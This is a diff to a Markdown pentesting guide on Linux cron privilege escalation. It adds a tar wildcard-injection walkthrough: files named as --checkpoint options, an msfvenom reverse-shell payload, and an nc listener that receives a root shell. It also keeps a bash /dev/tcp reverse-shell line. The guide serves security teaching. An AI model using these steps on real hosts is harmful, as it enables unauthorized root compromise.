@@ -379,7 +379,7 @@ Add a reverse shell code in the script with the following:
 bash -i >& /dev/tcp/YOUR_IP/443 0>&1
 ```
 
-Set up a listener in you host \(e.g Kali or Parrot\) and wait for the cron job to run. A reverse shell running as the root user should be received as soon as the script is executed by the cron:
+Set up a listener in your host \(e.g Kali or Parrot\) and wait for the cron job to run. A reverse shell running as the root user should be received as soon as the script is executed by the cron:
 
 ```text
 # nc –nvlp 443
@@ -437,6 +437,80 @@ tar czf /tmp/filename.tar.gz *
 ```
 
 With wildcards, we can execute anything and since that's the case then we can search in [GTFOBins](https://gtfobins.github.io/) for a program, in this scenario `tar` and see what we can do, for example executing a shell.
+
+When some command receives a wildcard character \(\*\) as an argument, the shell first expands the wildcard's filename, this is also known as globbing. A space-separated list of the current directory's file and directory names replaces the wildcard.
+
+Run the following command to better understand what I mean with wildcards:
+
+```bash
+cd ~ && echo *
+```
+
+Unix/Linux filesystems are generally generous with filenames and filename expansion occurs before the command is executed, it is possible to communicate command-line options \(e.g., -h, —help\) to programs by creating files with these names.
+
+The commands below should demonstrate how this works:
+
+```text
+$ ls *
+% touch ./-l
+$ ls *
+```
+
+We can make filenames that correspond to complicated options:
+
+```text
+--option=key=value
+```
+
+[GTFOBins](https://gtfobins.github.io) can assist us in determining whether a command contains any relevant command-line parameters for our needs.
+
+#### Wildcards Privilege Escalation
+
+Read the contents of the system-wide crontab:
+
+```text
+$ cat /etc/crontab
+...
+* * * * * root /usr/local/bin/script.sh
+```
+
+Read the contents of the `/usr/local/bin/script.sh` file:
+
+```bash
+$ cat /usr/local/bin/script.sh
+#!/bin/sh
+cd /home/user
+tar czf /tmp/backup.tar.gz *
+```
+
+> Note that the tar command is run with a wildcard in the /home/user directory.
+
+Visit [GTFOBins](https://gtfobins.github.io) and see what you can do with tar wildcards.
+
+Use msfvenom to create a reverse shell ELF payload or manually create file with a reverse shell code:
+
+```text
+$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=<YOUR_IP> LPORT=443 -f elf -o shell.elf
+```
+
+Copy the file to the `/home/user` directory on the remote host and create two files in the `/home/user` directory:
+
+```text
+$ touch /home/user/--checkpoint=1
+$ touch /home/user/--checkpoint-action=exec=shell.elf
+```
+
+Set up a listener to receive a shell when the cron executes the script:
+
+```text
+# nc -nvlp 443
+listening on [any] 443 ...
+connect to [192.168.10.10] from (UNKNOWN) [192.168.10.11] 47556
+bash: no job control in this shell
+root@debian:~# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+```
 
 ### Cron Script Overwrite
 
